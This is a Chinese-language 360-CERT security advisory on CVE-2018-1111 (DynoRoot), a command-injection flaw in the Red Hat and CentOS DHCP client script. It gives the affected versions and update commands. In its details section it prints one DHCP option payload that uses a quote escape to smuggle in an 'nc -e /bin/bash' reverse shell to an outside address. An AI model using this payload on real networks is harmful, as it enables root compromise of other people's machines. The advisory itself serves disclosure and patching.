# DynoRoot：Red Hat DHCP客户端命令执行漏洞(CVE-2018-1111)预警

阅读量 **252974**

发布时间 : 2018-05-16 15:26:09

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01c0b1c2c0c7782579.png)

报告编号： B6-2018-051601

报告来源： 360-CERT

报告作者： 360-CERT

更新日期： 2018-05-16

## 0x00 漏洞概述

近日，红帽官方发布了安全更新，修复了编号为CVE-2018-1111的远程代码执行漏洞，攻击者可以通过伪造DHCP服务器发送响应包，攻击红帽系统，获取root权限并执行任意命令。

目前相关利用代码已经公开，可用于本地网络攻击；360-CERT此漏洞进行了技术分析，认为该漏洞危害等级严重，建议使用相关用户尽快进行更新。

![](https://p403.ssl.qhimgs4.com/t01018a31fc9beb876e.png)

## 0x01 漏洞影响面

#### 影响版本

  * Red Hat Enterprise Linux Server 6
  * Red Hat Enterprise Linux Server 7
  * CentOS 6
  * CentOS 7

#### 修复方案

  * 受影响产品的更新

![](https://p3.ssl.qhimg.com/t01e250298fc95c89cc.png)

  * 软件包更新

    
    
        #yum update dhclient 
        #rpm -qa --changelog dhclient  | grep CVE-2018
            - Resolves: #1570898 - Fix CVE-2018-1111: Do not parse backslash as escape character
    

## 0x02 漏洞详情

DHCP 是一个局域网的网络协议，主要用于内部网络动态IP地址分配。

Red
Hat提供的DHCP客户端软件包dhclient的脚本为`/etc/NetworkManager/dispatcher.d/11-dhclient`（Red
Hat Enterprise Linux 7）和`/etc/NetworkManager/dispatcher.d/10-dhclient`（Red Hat
Enterprise Linux 6）；当NetworkManager组件从DHCP服务器收到DHCP响应时执行该脚本。

![](https://p403.ssl.qhimgs4.com/t013cd92966ddb3490b.jpeg)

使用单引号使参数值逃逸成功，导致了命令执行

    
    
    --dhcp-option="252,x'&nc -e /bin/bash 10.1.1.1 1337 #"
    

## 0x03 时间线

**2018-05-16** RedHat 官方发布更新公告

**2018-05-16** 360-CERT对漏洞进行评估，发布预警通告

## 0x04 参考链接

  1. <https://access.redhat.com/errata/RHSA-2018:1458>
  2. <https://twitter.com/_fel1x/status/996388421273882626>
  3. <https://dynoroot.ninja/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360CERT安全通告** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/145201](/post/id/145201)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞预警](/tag/漏洞预警)
  * [命令执行](/tag/命令执行)
  * [RedHat](/tag/RedHat)
  * [CVE-2018-1111](/tag/CVE-2018-1111)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t013be54b59d8ac5fe6.jpg)
360CERT安全通告

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

